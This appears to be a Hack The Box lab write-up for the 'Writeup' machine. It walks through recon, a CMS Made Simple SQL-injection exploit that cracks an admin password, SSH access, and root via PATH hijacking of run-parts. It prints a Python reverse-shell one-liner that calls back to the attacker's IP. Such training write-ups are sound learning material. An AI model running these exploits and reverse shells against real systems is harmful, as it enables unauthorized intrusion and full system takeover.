---
title: Hack The Box - Writeup
date: 2019-10-13 15:35:00 +0800
categories: [hackthebox]
tags: [linux, cmsmadesimple, ssh]
---

![](/assets/images/writeup.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

Always remember to map a domain name to the machine's IP address to ease your rooting !

```bash
$ echo "10.10.10.138 writeup.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sS writeup.htb -p 1-65535 -T4
Nmap scan report for writeup.htb (10.10.10.138)
Host is up (0.25s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds
```

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?

![](/assets/images/writeup1.png)

Hmm DoS Protection... I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a `robots.txt` ?

![](/assets/images/writeup2.png)

Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a `writeup` directory so lets try accessing it.

![](/assets/images/writeup3.png)

This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called `writeup`...


# Exploitation

![](/assets/images/writeup4.png)

Checking the source of the page, we find out that the website is using `CMS Made Simple`. Maybe we can find some exploits for it ?

```bash
$ searchsploit CMS Made Simple
------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                |  Path
                                                                              | (/usr/share/exploitdb/)
------------------------------------------------------------------------------ ----------------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasp | exploits/php/remote/46627.rb
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                       | exploits/php/webapps/26217.html
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                       | exploits/php/webapps/26298.txt
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                    | exploits/php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                        | exploits/php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                             | exploits/php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                   | exploits/php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                          | exploits/php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload              | exploits/php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                  | exploits/php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                 | exploits/php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting           | exploits/php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                              | exploits/php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                              | exploits/php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                 | exploits/php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery       | exploits/php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                              | exploits/php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                 | exploits/php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                 | exploits/php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                 | exploits/php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning               | exploits/php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                      | exploits/php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload              | exploits/php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload         | exploits/php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Uploa | exploits/php/webapps/46546.py
------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

Oh wow there are so many exploits! But which one do we use ? 

After some trial and error, the one that worked for me was `CMS Made Simple < 2.2.10 - SQL Injection`. Using the `--crack` option and specifying `rockyou.txt` as the wordlist,

```bash
$ python  /usr/share/exploitdb/exploits/php/webapps/46635.py -h
Usage: 46635.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
  -w WORDLIST, --wordlist=WORDLIST
                        Wordlist for crack admin password
  -c, --crack           Crack password with wordlist

$ python CVE-2019-9053.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

Neat ! We got the password for user `jkr`!

# user.txt

If we try to access `ssh` into `jkr`'s account using the credentials we found,

```bash
$ ssh jkr@writeup.htb
jkr@writeup.htb's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

jkr@writeup:~$ ls
user.txt
jkr@writeup:~$ cat user.txt
d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


# Enumeration

As `jkr`, we need to know what processes are being runned on the machine. To do so, I will be using [pspy](https://github.com/DominicBreuker/pspy). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.

On my machine:
```bash
$ mkdir httpserver
$ cd httpserver
$ cp ~/Downloads/pspy64 .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

On the `Writeup` machine:
```bash
jkr@writeup:~$ cd /tmp
jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64
--2019-08-28 22:59:29--  http://10.10.XXX.XXX/pspy64
Connecting to 10.10.XXX.XXX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4468984 (4.3M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                        100%[==============================================>]   4.26M  1006KB/s    in 5.2s    

2019-08-28 22:59:34 (842 KB/s) - ‘pspy64’ saved [4468984/4468984]

jkr@writeup:/tmp$ chmod 777 pspy64
jkr@writeup:/tmp$ ./pspy64
```

After monitoring for a while, we see some commands being run as `root`,
```bash
2019/08/28 23:02:25 CMD: UID=0    PID=2313   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/08/28 23:02:25 CMD: UID=0    PID=2314   | run-parts --lsbsysinit /etc/update-motd.d
```

For the first command, it is mainly setting the `$PATH` environment variable which determines where the system looks for executables. For the second command, it is running the `run-parts` command.

When I checked where the `run-parts` executable was located,
```bash
jkr@writeup:/tmp$ which run-parts
/bin/run-parts
```

`run-parts` was found at `/bin` but `/bin` is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called `run-parts` at `/usr/local/sbin`, the system will execute that instead of the `run-parts` at `/bin`! 

# Privilege Escalation

```bash
jkr@writeup:/tmp$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
nect((\"10.10.XXX.XXX\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts
```

For the executable, it is a script that contains the command that establishes a reverse shell back to our listener.

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

After a long while, I realised that I was not catching any connections from the `Writeup` machine. Is the `run-parts` not getting run ? Lets run `pspy` again to find out why!

```bash
2019/08/28 23:52:51 CMD: UID=0    PID=26053  | sshd: [accepted]
2019/08/28 23:52:51 CMD: UID=0    PID=26054  | sshd: [accepted]  
2019/08/28 23:52:55 CMD: UID=0    PID=26055  | sshd: jkr [priv]  
2019/08/28 23:52:55 CMD: UID=0    PID=26056  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/08/28 23:52:55 CMD: UID=0    PID=26057  | run-parts --lsbsysinit /etc/update-motd.d 
...
2019/08/28 23:54:27 CMD: UID=0    PID=26076  | sshd: [accepted]
2019/08/28 23:54:27 CMD: UID=0    PID=26077  | sshd: [accepted]  
2019/08/28 23:54:31 CMD: UID=0    PID=26078  | sshd: jkr [priv]  
2019/08/28 23:54:31 CMD: UID=0    PID=26079  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/08/28 23:54:31 CMD: UID=0    PID=26080  | run-parts --lsbsysinit /etc/update-motd.d 
```

By some chance, I noticed that the 2 commands were being run every time someone has logged in via `ssh`! So lets try this again...

# root.txt

On my machine (listener):
```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

On the `Writeup` machine:
```bash
jkr@writeup:/tmp$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
nect((\"10.10.XXX.XXX\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts
```

Again on my machine (on another terminal):
```bash
$ ssh jkr@writeup.htb
jkr@writeup.htb's password:

```

Again on my machine (listener):
```bash
connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.138] 59722
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

We are in!

```bash
# cd /root
# ls
bin
root.txt
# cat root.txt
eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !

